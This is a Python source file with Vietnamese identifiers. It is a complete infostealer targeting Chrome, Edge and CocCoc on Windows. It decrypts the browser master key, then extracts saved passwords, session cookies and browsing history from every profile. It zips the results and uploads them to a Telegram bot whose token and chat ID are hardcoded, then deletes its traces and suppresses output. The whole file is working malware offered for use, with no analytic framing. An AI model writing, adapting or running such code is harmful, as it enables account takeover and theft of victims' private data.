import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES 
import shutil
import requests
import asyncio
import logging
import zipfile 
import random 
try:
    import win32crypt
except ImportError:
    win32crypt = None
logging.basicConfig(level=logging.CRITICAL)
def lay_khoa(ten_trinh_duyet):
    try:
        duong_dan_tinh_trang = os.path.join(
            os.path.expanduser('~'),
            f'AppData\\Local\\{ten_trinh_duyet}\\User Data\\Local State'
        )
        if not os.path.exists(duong_dan_tinh_trang):
            return None
        with open(duong_dan_tinh_trang, "r", encoding="utf-8") as file:
            tinh_trang = json.load(file)
        khoa_ma = base64.b64decode(tinh_trang["os_crypt"]["encrypted_key"])
        if win32crypt:
            khoa_ma = khoa_ma[5:]
            khoa = win32crypt.CryptUnprotectData(khoa_ma, None, None, None, 0)[1]
        else:
            khoa = khoa_ma
        return khoa
    except Exception as e:
        return None



def decmatkhau(mat_khau_ma, khoa):
    try:
        iv = mat_khau_ma[3:15]
        tag = mat_khau_ma[-16:]
        mat_khau_ma = mat_khau_ma[15:-16]
        
        cipher = AES.new(khoa, AES.MODE_GCM, iv)
        mat_khau = cipher.decrypt_and_verify(mat_khau_ma, tag)
        
        return mat_khau.decode()
    except Exception as e:
        return None

def lay_duong_dan_db(ten_trinh_duyet, ten_profile):
    return os.path.join(
        os.path.expanduser('~'),
        f'AppData\\Local\\{ten_trinh_duyet}\\User Data\\{ten_profile}\\Login Data'
    )

def lay_ten_profile(ten_trinh_duyet, ten_profile):
    duong_dan_user_data = os.path.join(
        os.path.expanduser('~'),
        f'AppData\\Local\\{ten_trinh_duyet}\\User Data\\{ten_profile}\\Preferences'
    )
    try:
        if not os.path.exists(duong_dan_user_data):
            return "ProfileKhongXacDinh"
        with open(duong_dan_user_data, "r", encoding="utf-8") as file:
            tuy_chinh = json.load(file)
        return tuy_chinh.get("profile", {}).get("name", "ProfileKhongXacDinh")
    except Exception as e:
        return "ProfileKhongXacDinh"

def laydatalogin(ten_trinh_duyet, ten_profile):
    duong_dan_db = lay_duong_dan_db(ten_trinh_duyet, ten_profile)
    if not os.path.exists(duong_dan_db):
        return []
    shutil.copyfile(duong_dan_db, "LoginData_copy.db")
    conn = sqlite3.connect("LoginData_copy.db")
    cursor = conn.cursor()
    khoa = lay_khoa(ten_trinh_duyet)
    if khoa is None:
        conn.close()
        os.remove("LoginData_copy.db")
        return []
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    thong_tin_dang_nhap = []
    for row in cursor.fetchall():
        url = row[0]
        username = row[1]
        mat_khau_ma = row[2]
        if mat_khau_ma:
            mat_khau = decmatkhau(mat_khau_ma, khoa)
            if mat_khau:
                thong_tin_dang_nhap.append({
                    "url": url,
                    "username": username,
                    "password": mat_khau
                })
    conn.close()
    os.remove("LoginData_copy.db")
    return thong_tin_dang_nhap

def lay_danh_sach_profile(ten_trinh_duyet):
    thu_muc_profile = os.path.join(os.path.expanduser('~'), f'AppData\\Local\\{ten_trinh_duyet}\\User Data')
    if os.path.exists(thu_muc_profile):
        return [d for d in os.listdir(thu_muc_profile) if os.path.isdir(os.path.join(thu_muc_profile, d)) and d.startswith("Profile")] + ["Default"]
    return []

def lay_duong_dan_coccoc():
    return 'CocCoc\\Browser'

def tieude(ten_profile):
    ten_profile = ten_profile.upper()
    ten_profile = f"PROFILE: {ten_profile}"
    width = len(ten_profile) + 6
    lines = [
        "╔" + "═" * width + "╗",
        f"║ {ten_profile.center(width - 2)} ║",
        "╚" + "═" * width + "╝"
    ]
    return "\n".join(lines)

def dinhdangtext(url, email, mat_khau, tac_gia, width):
    url_text = f"│» URL      : {url.ljust(width - 6)} │"
    email_text = f"│» Email    : {email.ljust(width - 6)} │"
    mat_khau_text = f"│» Password : {mat_khau.ljust(width - 6)} │"
    tac_gia_text = f"│» Author   : {tac_gia.ljust(width - 6)} │"
    lines = [
        "┌" + "─" * width + "┐",
        url_text,
        email_text,
        mat_khau_text,
        tac_gia_text,
        "└" + "─" * width + "┘"
    ]
    return "\n".join(lines)

def lay_lich_su(ten_trinh_duyet, ten_profile):
    duong_dan_db = os.path.join(
        os.path.expanduser('~'),
        f'AppData\\Local\\{ten_trinh_duyet}\\User Data\\{ten_profile}\\History'
    )
    if not os.path.exists(duong_dan_db):
        return []
    shutil.copyfile(duong_dan_db, "History_copy.db")
    conn = sqlite3.connect("History_copy.db")
    cursor = conn.cursor()
    lich_su = []
    try:
        cursor.execute("PRAGMA table_info(urls)")
        cols = [col[1] for col in cursor.fetchall()]
        cot_tham_ghi = 'last_visit_time' if 'last_visit_time' in cols else 'visit_time'
        cursor.execute(f"SELECT url, title, {cot_tham_ghi} FROM urls")
        for row in cursor.fetchall():
            url = row[0]
            tieu_de = row[1]
            thoigianvo = row[2]
            lich_su.append({
                "url": url,
                "title": tieu_de,
                "visit_time": thoigianvo
            })
    except Exception as e:
        pass
    conn.close()
    os.remove("History_copy.db")
    return lich_su

def guitkmk(ten_trinh_duyet, ten_profile, thong_tin_dang_nhap):
    ten_file = f"{ten_trinh_duyet} - {ten_profile} - Cre.txt"
    try:
        with open(ten_file, "w", encoding="utf-8") as file:
            for thong_tin in thong_tin_dang_nhap:
                url = thong_tin["url"]
                username = thong_tin["username"]
                mat_khau = thong_tin["password"]
                tac_gia = "huang"
                width = max(len(url), len(username), len(mat_khau), len(tac_gia)) + 6
                thong_tin_dinh_dang = dinhdangtext(url, username, mat_khau, tac_gia, width)
                file.write(thong_tin_dinh_dang + "\n")
    except Exception as e:
        pass
def giai_ma_cookie(khoa, encrypted_value):
    """Giải mã cookie."""
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv = encrypted_value[3:15] 
            encrypted_value = encrypted_value[15:] 
            cipher = AES.new(khoa, AES.MODE_GCM, iv)  
            decrypted_value = cipher.decrypt(encrypted_value)[:-16] 
            return decrypted_value.decode('utf-8')
        else:
            return encrypted_value.decode('utf-8')
    except Exception as e:
        logging.error(f"Không thể giải mã cookie: {e}")
        return ""


def laycookie(ten_trinh_duyet, ten_profile, ten_tap_tin):
    """Lấy cookie từ trình duyệt."""
    thu_muc_cookie = os.path.join(os.path.expanduser('~'), f'AppData\\Local\\{ten_trinh_duyet}\\User Data\\{ten_profile}\\Network\\Cookies')
    
    if not os.path.exists(thu_muc_cookie):
        logging.warning(f"Không tìm thấy thư mục cookie: {thu_muc_cookie}")
        return []
    
    try:
        shutil.copyfile(thu_muc_cookie, "cookie_copy.db")
    except PermissionError:
        logging.error(f"Permission denied: {thu_muc_cookie}")
        return []
    
    conn = sqlite3.connect("cookie_copy.db")
    cursor = conn.cursor()
    cookie = []
    
    khoa = lay_khoa(ten_trinh_duyet)
    if not khoa:
        logging.error("Không thể lấy khóa để giải mã cookie")
        return []

    try:
        cursor.execute("SELECT host_key, name, encrypted_value, creation_utc, expires_utc FROM cookies")
        
        with open(ten_tap_tin, 'w', encoding='utf-8') as f:
            for row in cursor.fetchall():
                host_key = row[0]
                name = row[1]
                encrypted_value = row[2]
                creation_time = row[3]
                expiry_time = row[4]
                
                decrypted_value = giai_ma_cookie(khoa, encrypted_value)
                
                cookie_data = {
                    "host": host_key,
                    "name": name,
                    "value": decrypted_value,
                    "creation_time": creation_time,
                    "expiry_time": expiry_time
                }
                cookie.append(cookie_data)

                f.write(f"Host: {cookie_data['host']}\n")
                f.write(f"Host: {cookie_data['host']}\n")
                f.write(f"{cookie_data['name']}: {cookie_data['value']}\n")
                f.write(f"Creation Time: {cookie_data['creation_time']}\n")
                f.write(f"Expiry Time: {cookie_data['expiry_time']}\n")
                f.write("=" * 50 + "\n")
                
    except Exception as e:
        logging.error(f"Lỗi: {e}")
    finally:
        conn.close()
        os.remove("cookie_copy.db")
    
    return cookie


def guicookie(ten_trinh_duyet, ten_profile, cookie_list):
    """Ghi cookie vào file."""
    ten_tap_tin = f"{ten_trinh_duyet} - {ten_profile} - Cookies.txt"
    
    with open(ten_tap_tin, 'w', encoding='utf-8') as f:
        for cookie in cookie_list:
            f.write(f"Host: {cookie['host']}\n")
            f.write(f"Host: {cookie['host']}\n")
            f.write(f"{cookie['name']}: {cookie['value']}\n")
            f.write(f"Creation Time: {cookie['creation_time']}\n")
            f.write(f"Expiry Time: {cookie['expiry_time']}\n")
            f.write("\n")


def guihistory(ten_trinh_duyet, ten_profile, lich_su):
    ten_file = f"{ten_trinh_duyet} - {ten_profile} - History.txt"
    try:
        with open(ten_file, "w", encoding="utf-8") as file:
            for item in lich_su:
                lich_su_str = f"URL: {item['url']}, Title: {item['title']}, Visit Time: {item['visit_time']}"
                file.write(lich_su_str + "\n")
    except Exception as e:
        pass

def tao_zip_chung(danh_sach_tap_tin):
    """Tạo file zip từ danh sách tập tin."""
    hhhhh = random.randint(1, 999999)
    zip_filename = f'TongHop_Profile_Data_{hhhhh}.zip'
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for filename in danh_sach_tap_tin:
            if os.path.exists(filename):
                zipf.write(filename)
    return zip_filename
def send_file_to_telegram(file_path, bot_token, chat_id):
    # Telegram API URL for sending files
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    
    # Open the file in binary mode and prepare it for upload
    with open(file_path, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': chat_id}
        response = requests.post(url, files=files, data=data)
    if response.status_code == 200:
        print("")
    else:
        print('')

async def main1():
    ten_trinh_duyet_list = ['Google Chrome', 'Microsoft Edge', 'CocCoc']
    trinh_duyet_dict = {
        'Google Chrome': 'Google\\Chrome',
        'Microsoft Edge': 'Microsoft\\Edge',
        'CocCoc': lay_duong_dan_coccoc()
    }
    
    danh_sach_tap_tin = [] 
    
    for ten_trinh_duyet in ten_trinh_duyet_list:
        danh_sach_profile = lay_danh_sach_profile(trinh_duyet_dict[ten_trinh_duyet])
        
        for ten_profile in danh_sach_profile:
            thong_tin_dang_nhap = laydatalogin(trinh_duyet_dict[ten_trinh_duyet], ten_profile)
            lich_su = lay_lich_su(trinh_duyet_dict[ten_trinh_duyet], ten_profile)
            cookie = laycookie(trinh_duyet_dict[ten_trinh_duyet], ten_profile, f"{ten_trinh_duyet} - {ten_profile} - Cookies.txt")
            guitkmk(ten_trinh_duyet, ten_profile, thong_tin_dang_nhap)
            guihistory(ten_trinh_duyet, ten_profile, lich_su)
            guicookie(ten_trinh_duyet, ten_profile, cookie)

            danh_sach_tap_tin.append(f"{ten_trinh_duyet} - {ten_profile} - Cre.txt")
            danh_sach_tap_tin.append(f"{ten_trinh_duyet} - {ten_profile} - History.txt")
            danh_sach_tap_tin.append(f"{ten_trinh_duyet} - {ten_profile} - Cookies.txt")
    zip_filename = tao_zip_chung(danh_sach_tap_tin)
    bot_token = '6595208188:AAGvriwrVgYey6MLAcjEJ3nHWxuheWKb5Ws'  
    chat_id = '-1001578836295'    
    send_file_to_telegram(zip_filename, bot_token, chat_id)
    for filename in danh_sach_tap_tin:
        if os.path.exists(filename):
            os.remove(filename)

    if os.path.exists(zip_filename):
        os.remove(zip_filename)
def pytts():
    asyncio.run(main1())

if __name__ == "__main__":
    pytts()